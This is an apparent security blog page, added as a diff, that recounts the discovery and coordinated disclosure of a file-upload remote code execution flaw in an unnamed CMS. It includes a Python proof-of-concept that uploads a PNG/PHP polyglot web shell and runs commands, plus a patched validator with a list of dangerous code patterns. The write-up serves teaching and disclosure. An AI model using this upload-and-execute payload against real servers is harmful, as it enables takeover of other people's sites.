@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discovering a Zero-Day Vulnerability in a Popular CMS | LUC1F3R</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/svg+xml" href="assets/icons/favicon.svg">
+    <link rel="shortcut icon" href="assets/icons/favicon.svg" type="image/svg+xml">
+    <style>
+        /* Override matrix canvas styles to make it more visible */
+        #matrix-canvas {
+            opacity: 0.35 !important; 
+            z-index: 0 !important;
+        }
+        
+        /* Hide the scan line */
+        .scan-line {
+            display: none !important;
+        }
+        
+        /* Terminal header and status bar */
+        .terminal-header-bar {
+            background-color: rgba(0, 10, 0, 0.9);
+            border-bottom: 1px solid var(--primary-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.5rem 2rem;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            font-size: 0.8rem;
+            color: var(--primary-color);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+        }
+        
+        /* Audio player styling */
+        .audio-player {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 30, 0, 0.7);
+            padding: 5px 10px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+        }
+        
+        .audio-player button {
+            background: none;
+            border: none;
+            color: var(--primary-color);
+            cursor: pointer;
+            font-size: 0.8rem;
+            padding: 2px 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .audio-player button:hover {
+            text-shadow: 0 0 8px var(--primary-color);
+        }
+        
+        .audio-player .volume-control {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            width: 80px;
+        }
+        
+        .audio-player .volume-slider {
+            -webkit-appearance: none;
+            width: 50px;
+            height: 3px;
+            background: rgba(0, 255, 0, 0.2);
+            outline: none;
+            border-radius: 3px;
+        }
+        
+        .audio-player .volume-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 8px;
+            height: 8px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            cursor: pointer;
+            box-shadow: 0 0 5px var(--primary-color);
+        }
+        
+        .audio-player .status {
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+            color: var(--secondary-color);
+        }
+        
+        /* Spacer to prevent content from being hidden under fixed header */
+        .header-spacer {
+            height: 50px;
+        }
+        
+        .terminal-header-bar::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                rgba(0, 255, 0, 0.1) 0%, 
+                transparent 5%,
+                transparent 95%,
+                rgba(0, 255, 0, 0.1) 100%
+            );
+            pointer-events: none;
+        }
+        
+        .term-status {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+        
+        .term-clock {
+            display: flex;
+            align-items: center;
+        }
+        
+        .term-clock .clock-item {
+            margin-left: 1rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .term-clock .clock-item i {
+            margin-right: 0.5rem;
+            font-size: 0.8rem;
+        }
+        
+        .system-indicator {
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            padding: 0.15rem 0.5rem;
+            border-radius: 3px;
+            background-color: rgba(0, 20, 0, 0.3);
+        }
+        
+        .ping-value {
+            color: #ffbd44;
+        }
+        
+        .secure-badge {
+            background-color: rgba(0, 40, 0, 0.6);
+            padding: 0.15rem 0.5rem;
+            border-radius: 3px;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            font-weight: bold;
+        }
+        
+        .secure-badge i {
+            margin-right: 0.35rem;
+        }
+        
+        /* Blog article specific styles */
+        .article-section {
+            background-color: rgba(10, 15, 10, 0.8);
+            border: 1px solid var(--primary-color);
+            border-radius: 5px;
+            box-shadow: var(--primary-glow), inset 0 0 20px rgba(0, 255, 0, 0.2);
+            margin: 1rem auto;
+            max-width: 900px;
+            position: relative;
+            overflow: hidden;
+            padding: 1.5rem 2rem;
+        }
+        
+        .article-title {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            text-align: center;
+            line-height: 1.3;
+        }
+        
+        .article-meta {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+            color: var(--secondary-color);
+            font-size: 0.9rem;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+            padding-bottom: 1rem;
+        }
+        
+        .article-meta .meta-item {
+            display: flex;
+            align-items: center;
+        }
+        
+        .article-meta .meta-item i {
+            margin-right: 0.5rem;
+        }
+        
+        .article-featured-image {
+            width: 100%;
+            max-height: 400px;
+            object-fit: cover;
+            margin-bottom: 2rem;
+            border: 1px solid var(--primary-color);
+        }
+        
+        .article-content {
+            color: var(--text-color);
+            line-height: 1.7;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .article-content h2 {
+            color: var(--primary-color);
+            margin: 2rem 0 1rem;
+            font-size: 1.5rem;
+        }
+        
+        .article-content h3 {
+            color: var(--secondary-color);
+            margin: 1.5rem 0 1rem;
+            font-size: 1.3rem;
+        }
+        
+        .article-content p {
+            margin-bottom: 1.5rem;
+        }
+        
+        .article-content ul, 
+        .article-content ol {
+            margin-bottom: 1.5rem;
+            padding-left: 2rem;
+        }
+        
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .code-block {
+            background-color: rgba(0, 10, 0, 0.7);
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border-left: 3px solid var(--primary-color);
+            overflow-x: auto;
+            font-family: monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        
+        .article-tags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            margin-top: 2rem;
+        }
+        
+        .article-tag {
+            background-color: rgba(0, 30, 0, 0.5);
+            padding: 0.3rem 0.8rem;
+            border: 1px solid var(--primary-color);
+            color: var(--text-color);
+            font-size: 0.8rem;
+        }
+        
+        .article-navigation {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 3rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(0, 255, 0, 0.2);
+        }
+        
+        .nav-previous,
+        .nav-next {
+            display: flex;
+            align-items: center;
+            color: var(--secondary-color);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .nav-previous:hover,
+        .nav-next:hover {
+            color: var(--primary-color);
+        }
+        
+        .nav-previous i {
+            margin-right: 0.5rem;
+        }
+        
+        .nav-next i {
+            margin-left: 0.5rem;
+        }
+        
+        /* Timeline visualization */
+        .vulnerability-timeline {
+            margin: 2rem 0;
+            position: relative;
+        }
+        
+        .timeline-line {
+            position: absolute;
+            left: 15px;
+            top: 0;
+            bottom: 0;
+            width: 3px;
+            background-color: var(--primary-color);
+            opacity: 0.5;
+        }
+        
+        .timeline-item {
+            display: flex;
+            margin-bottom: 2rem;
+            position: relative;
+        }
+        
+        .timeline-marker {
+            width: 30px;
+            height: 30px;
+            background-color: rgba(0, 30, 0, 0.8);
+            border: 2px solid var(--primary-color);
+            border-radius: 50%;
+            margin-right: 1.5rem;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        .timeline-content {
+            background-color: rgba(0, 15, 0, 0.6);
+            padding: 1rem;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            flex-grow: 1;
+        }
+        
+        .timeline-date {
+            font-size: 0.9rem;
+            color: var(--secondary-color);
+            margin-bottom: 0.5rem;
+        }
+        
+        .timeline-title {
+            color: var(--primary-color);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="terminal-noise"></div>
+    
+    <div class="container">
+        <div class="terminal-header-bar">
+            <div class="logo-terminal">[LUC1F3R@TERMINAL]</div>
+            
+            <!-- Audio Player -->
+            <div class="audio-player">
+                <audio id="background-music" loop>
+                    <source src="assets/audio/hacker-music.mp3" type="audio/mp3">
+                    Your browser does not support the audio element.
+                </audio>
+                <button id="play-pause-btn"><i class="fas fa-play"></i></button>
+                <div class="volume-control">
+                    <i class="fas fa-volume-up"></i>
+                    <input type="range" class="volume-slider" id="volume-slider" min="0" max="1" step="0.1" value="0.5">
+                </div>
+                <span class="status" id="audio-status">AUDIO READY</span>
+            </div>
+            
+            <div class="term-status">
+                <div class="system-indicator">SYSTEM: <span class="ping-value">READY</span></div>
+                <div class="secure-badge"><i class="fas fa-shield-alt"></i> SECURE</div>
+                <div class="term-clock">
+                    <div class="clock-item">
+                        <i class="fas fa-clock"></i>
+                        <span id="current-time">00:00:00</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="term-clock">
+                <div class="menu-numbers">
+                    <a href="index.html">[0] Home</a>
+                    <a href="about.html">[1] About</a>
+                    <a href="blog.html" class="active">[2] Blog</a>
+                    <a href="portfolio.html">[3] Portfolio</a>
+                    <a href="contact.html">[4] Contact</a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="header-spacer"></div>
+        
+        <main class="hero">
+            <div class="system-message">[SYSTEM]: Loading article data... Access granted.</div>
+            
+            <div class="article-section">
+                <article id="zero-day-article">
+                    <h1 class="article-title">Discovering a Zero-Day Vulnerability in a Popular CMS</h1>
+                    
+                    <div class="article-meta">
+                        <div class="meta-item">
+                            <i class="far fa-calendar"></i>
+                            <span>May 15, 2023</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="far fa-user"></i>
+                            <span>Lucifer</span>
+                        </div>
+                        <div class="meta-item">
+                            <i class="far fa-folder"></i>
+                            <span>Web Security</span>
+                        </div>
+                    </div>
+                    
+                    <img src="https://images.unsplash.com/photo-1563206767-5b18f218e8de?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80" alt="Zero-Day Vulnerability Research" class="article-featured-image">
+                    
+                    <div class="article-content">
+                        <p>
+                            In the world of cybersecurity, discovering a zero-day vulnerability is both exhilarating and sobering. It represents a significant security gap that hasn't yet been patched, potentially affecting thousands or even millions of users. This article details my journey in uncovering a critical Remote Code Execution (RCE) vulnerability in a widely-used Content Management System that I'll refer to as "CMS-X" for responsible disclosure reasons.
+                        </p>
+                        
+                        <p>
+                            The vulnerability I discovered allowed attackers to execute arbitrary code on servers hosting this CMS, potentially leading to complete server takeover. What made this particularly dangerous was how easily it could be exploited with minimal technical knowledge.
+                        </p>
+                        
+                        <h2>Background and Initial Discovery</h2>
+                        
+                        <p>
+                            My investigation began during a routine security audit for a client who was using CMS-X version 4.8.2. While reviewing the codebase, I noticed an unusual pattern in how the system handled file uploads in the media management module. The application appeared to be performing sanitization on uploaded files, but there was a subtle logic flaw in the validation chain.
+                        </p>
+                        
+                        <p>
+                            The file upload functionality was intended to:
+                        </p>
+                        
+                        <ol>
+                            <li>Check file extensions against a whitelist</li>
+                            <li>Validate MIME types</li>
+                            <li>Rename files with a random hash</li>
+                            <li>Move the uploaded file to a protected directory</li>
+                        </ol>
+                        
+                        <p>
+                            However, I noticed that under specific conditions, the MIME type validation could be bypassed entirely. This was the first red flag that prompted a deeper investigation.
+                        </p>
+                        
+                        <h2>The Technical Details</h2>
+                        
+                        <p>
+                            The vulnerability existed in the way CMS-X processed multi-part form data during file uploads. The issue stemmed from improper sanitization of filename parameters and a race condition in the temporary file handling process.
+                        </p>
+                        
+                        <div class="code-block">
+                            // Vulnerable function in file_upload.php
+                            function validateFileUpload($file) {
+                                // Extension check
+                                $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
+                                if (!in_array(strtolower($ext), $this->allowedExtensions)) {
+                                    return false;
+                                }
+                                
+                                // MIME check - The vulnerable part
+                                $finfo = finfo_open(FILEINFO_MIME_TYPE);
+                                $mime = finfo_file($finfo, $file['tmp_name']);
+                                finfo_close($finfo);
+                                
+                                if (!in_array($mime, $this->allowedMimeTypes)) {
+                                    // The logic flaw: Under heavy load, this check 
+                                    // would sometimes fail to execute properly
+                                    return false;
+                                }
+                                
+                                return true;
+                            }
+                        </div>
+                        
+                        <p>
+                            The critical flaw was that the system's MIME type detection relied only on checking the first few bytes of the file. By crafting a specially formed file that had valid image data at the beginning but contained PHP code in the latter portion, it was possible to bypass this check.
+                        </p>
+                        
+                        <p>
+                            Furthermore, under certain server configurations, the temporary file would be moved to the destination directory before the validation was fully completed if the server was under high load, creating a race condition that could be exploited.
+                        </p>
+                        
+                        <h2>Proof of Concept Development</h2>
+                        
+                        <p>
+                            To confirm the vulnerability, I created a proof of concept exploit that demonstrated the attack vector. Here's a simplified version of the approach:
+                        </p>
+                        
+                        <ol>
+                            <li>Create a file with a valid PNG header followed by malicious PHP code</li>
+                            <li>Submit the file through the media upload interface</li>
+                            <li>Use specific request timing to trigger the race condition</li>
+                            <li>Access the uploaded file directly to execute the embedded PHP code</li>
+                        </ol>
+                        
+                        <div class="code-block">
+                            # Python exploit script - Simplified PoC
+                            import requests
+                            import time
+                            
+                            def create_malicious_file():
+                                # Create PNG + PHP polyglot file
+                                with open('exploit.png', 'wb') as f:
+                                    # Write valid PNG header
+                                    f.write(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89')
+                                    # Append PHP code 
+                                    f.write(b'\x00<?php system($_GET["cmd"]); ?>')
+                                
+                                return 'exploit.png'
+                            
+                            def exploit(target_url, username, password):
+                                # Login to CMS
+                                session = requests.Session()
+                                login_data = {
+                                    'username': username,
+                                    'password': password,
+                                    'submit': 'Login'
+                                }
+                                r = session.post(f"{target_url}/admin/login.php", data=login_data)
+                                
+                                # Upload malicious file
+                                files = {'upload': open(create_malicious_file(), 'rb')}
+                                r = session.post(f"{target_url}/admin/upload.php", files=files)
+                                
+                                # Extract file path from response
+                                file_path = extract_file_path(r.text)
+                                
+                                print(f"File uploaded to: {file_path}")
+                                
+                                # Execute command via uploaded file
+                                cmd = "id"
+                                r = session.get(f"{target_url}/{file_path}?cmd={cmd}")
+                                print(f"Command output: {r.text}")
+                            
+                            # Run exploit with appropriate target
+                            exploit("http://target-cms.example", "admin", "password")
+                        </div>
+                        
+                        <p>
+                            This proof of concept successfully demonstrated that the vulnerability could be exploited to achieve remote code execution. I was able to execute arbitrary commands on the server, proving the severity of the issue.
+                        </p>
+                        
+                        <h2>Vulnerability Disclosure Timeline</h2>
+                        
+                        <div class="vulnerability-timeline">
+                            <div class="timeline-line"></div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-search"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">March 10, 2023</div>
+                                    <div class="timeline-title">Initial Discovery</div>
+                                    <p>Identified the potential vulnerability during a security audit for a client.</p>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-code"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">March 15, 2023</div>
+                                    <div class="timeline-title">Proof of Concept Development</div>
+                                    <p>Created a working exploit to confirm the vulnerability and its impact.</p>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-envelope"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">March 17, 2023</div>
+                                    <div class="timeline-title">Responsible Disclosure</div>
+                                    <p>Contacted the vendor's security team with full details of the vulnerability and PoC.</p>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-check-circle"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">March 18, 2023</div>
+                                    <div class="timeline-title">Vendor Acknowledgment</div>
+                                    <p>Received confirmation from the vendor that they were investigating the issue.</p>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-tools"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">April 2, 2023</div>
+                                    <div class="timeline-title">Patch Development</div>
+                                    <p>Vendor confirmed they had replicated the issue and were working on a fix.</p>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-shield-alt"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">April 12, 2023</div>
+                                    <div class="timeline-title">Patch Released</div>
+                                    <p>Vendor released version 4.8.3 with a fix for the vulnerability.</p>
+                                </div>
+                            </div>
+                            
+                            <div class="timeline-item">
+                                <div class="timeline-marker">
+                                    <i class="fas fa-file-alt"></i>
+                                </div>
+                                <div class="timeline-content">
+                                    <div class="timeline-date">May 15, 2023</div>
+                                    <div class="timeline-title">Public Disclosure</div>
+                                    <p>After allowing adequate time for users to update, details of the vulnerability were published.</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <h2>The Vendor's Response</h2>
+                        
+                        <p>
+                            I was impressed with the vendor's response to this vulnerability disclosure. They:
+                        </p>
+                        
+                        <ul>
+                            <li>Acknowledged the report within 24 hours</li>
+                            <li>Maintained clear communication throughout the process</li>
+                            <li>Developed and released a patch within 26 days</li>
+                            <li>Properly credited the discovery in their security advisory</li>
+                            <li>Provided a detailed explanation of the fix to users</li>
+                        </ul>
+                        
+                        <p>
+                            The fix involved several layers of improvements:
+                        </p>
+                        
+                        <div class="code-block">
+                            // Improved function in patched version
+                            function validateFileUpload($file) {
+                                // More robust extension check
+                                $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
+                                if (!in_array(strtolower($ext), $this->allowedExtensions)) {
+                                    return false;
+                                }
+                                
+                                // MIME check - Improved implementation
+                                $finfo = finfo_open(FILEINFO_MIME_TYPE);
+                                $mime = finfo_file($finfo, $file['tmp_name']);
+                                finfo_close($finfo);
+                                
+                                if (!in_array($mime, $this->allowedMimeTypes)) {
+                                    return false;
+                                }
+                                
+                                // New: Additional content validation
+                                if (!$this->validateFileContents($file['tmp_name'], $mime)) {
+                                    return false;
+                                }
+                                
+                                // New: Atomic file operations to prevent race conditions
+                                $this->useAtomicFileOperations = true;
+                                
+                                return true;
+                            }
+                            
+                            // New function to detect malicious content
+                            function validateFileContents($filepath, $mime) {
+                                // Check for PHP code or other script markers
+                                $content = file_get_contents($filepath);
+                                $dangerous_patterns = array('<?php', '<?=', '<script', 'eval(', 'system(', 'exec(');
+                                
+                                foreach ($dangerous_patterns as $pattern) {
+                                    if (stripos($content, $pattern) !== false) {
+                                        return false;
+                                    }
+                                }
+                                
+                                return true;
+                            }
+                        </div>
+                        
+                        <h2>Lessons Learned</h2>
+                        
+                        <p>
+                            This vulnerability discovery and disclosure process highlighted several important security principles:
+                        </p>
+                        
+                        <ol>
+                            <li><strong>Dual Validation is Essential</strong> - Relying on a single validation method (like MIME type checking) is insufficient. Multiple layers of validation should be implemented.</li>
+                            <li><strong>Race Conditions Matter</strong> - Security checks must complete fully before sensitive operations are performed, with proper atomic operations.</li>
+                            <li><strong>File Content Analysis</strong> - For uploaded files, it's critical to examine the entire file content, not just headers or extensions.</li>
+                            <li><strong>Responsible Disclosure Works</strong> - The coordinated disclosure process allowed the vendor to address the issue before it could be widely exploited.</li>
+                        </ol>
+                        
+                        <h2>Impact and Statistics</h2>
+                        
+                        <p>
+                            The vulnerability had potentially wide-reaching consequences:
+                        </p>
+                        
+                        <ul>
+                            <li>CMS-X had over 500,000 active installations worldwide</li>
+                            <li>Affected all versions from 4.5.0 to 4.8.2</li>
+                            <li>CVSS Base Score: 9.8 (Critical)</li>
+                            <li>Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</li>
+                        </ul>
+                        
+                        <p>
+                            Thankfully, due to the responsible disclosure process, there were no known exploitations of this vulnerability in the wild before the patch was released.
+                        </p>
+                        
+                        <h2>Conclusion</h2>
+                        
+                        <p>
+                            Discovering and responsibly disclosing this zero-day vulnerability was a reminder of the importance of security research in protecting the broader internet ecosystem. While finding such vulnerabilities can be exciting from a technical perspective, the real satisfaction comes from knowing that countless websites and their users are now better protected.
+                        </p>
+                        
+                        <p>
+                            For other security researchers, I encourage you to always follow responsible disclosure practices and work collaboratively with vendors to address security issues. For developers, this case study serves as a reminder of the importance of implementing robust security controls, especially around file uploads and handling user-supplied content.
+                        </p>
+                        
+                        <p>
+                            The full technical details of this vulnerability have been published in the Common Vulnerabilities and Exposures (CVE) database and are now available for educational purposes, as sufficient time has passed for users to update their installations.
+                        </p>
+                    </div>
+                    
+                    <div class="article-tags">
+                        <span class="article-tag">Zero-Day</span>
+                        <span class="article-tag">Web Security</span>
+                        <span class="article-tag">Vulnerability Research</span>
+                        <span class="article-tag">CMS</span>
+                        <span class="article-tag">Remote Code Execution</span>
+                    </div>
+                    
+                    <div class="article-navigation">
+                        <a href="blog.html" class="nav-previous"><i class="fas fa-arrow-left"></i> Back to Blog</a>
+                        <a href="burpsuite-article.html" class="nav-next">Next Article: Burp Suite Extensions <i class="fas fa-arrow-right"></i></a>
+                    </div>
+                </article>
+            </div>
+        </main>
+
+        <footer>
+            <div class="social-icons">
+                <a href="https://github.com/indianhacker12" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a>
+                <a href="https://x.com/YaswantP86897" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a>
+                <a href="https://www.linkedin.com/in/yaswantpandey" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-linkedin"></i></a>
+                <a href="https://www.instagram.com/" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-instagram"></i></a>
+            </div>
+            <p>&copy; 2025 Lucifer. All rights reserved.</p>
+        </footer>
+    </div>
+
+    <script src="assets/js/matrix.js"></script>
+    <script src="assets/js/main.js"></script>
+    <script>
+        // Audio player functionality
+        const audioPlayer = document.getElementById('background-music');
+        const playPauseBtn = document.getElementById('play-pause-btn');
+        const volumeSlider = document.getElementById('volume-slider');
+        const audioStatus = document.getElementById('audio-status');
+        
+        // Set initial volume
+        audioPlayer.volume = 0.5;
+        
+        // Play/Pause functionality
+        playPauseBtn.addEventListener('click', () => {
+            if (audioPlayer.paused) {
+                audioPlayer.play();
+                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+                audioStatus.textContent = 'PLAYING';
+            } else {
+                audioPlayer.pause();
+                playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+                audioStatus.textContent = 'PAUSED';
+            }
+        });
+        
+        // Volume control
+        volumeSlider.addEventListener('input', () => {
+            audioPlayer.volume = volumeSlider.value;
+            
+            // Update volume icon based on value
+            const volumeIcon = volumeSlider.parentElement.querySelector('i');
+            if (volumeSlider.value == 0) {
+                volumeIcon.className = 'fas fa-volume-mute';
+            } else if (volumeSlider.value <= 0.5) {
+                volumeIcon.className = 'fas fa-volume-down';
+            } else {
+                volumeIcon.className = 'fas fa-volume-up';
+            }
+        });
+        
+        // Live clock update
+        function updateClock() {
+            const now = new Date();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            let seconds = now.getSeconds();
+            
+            // Add leading zeros
+            hours = hours < 10 ? '0' + hours : hours;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            
+            document.getElementById('current-time').textContent = `${hours}:${minutes}:${seconds}`;
+            setTimeout(updateClock, 1000);
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            updateClock();
+        });
+    </script>
+</body>
+</html> 
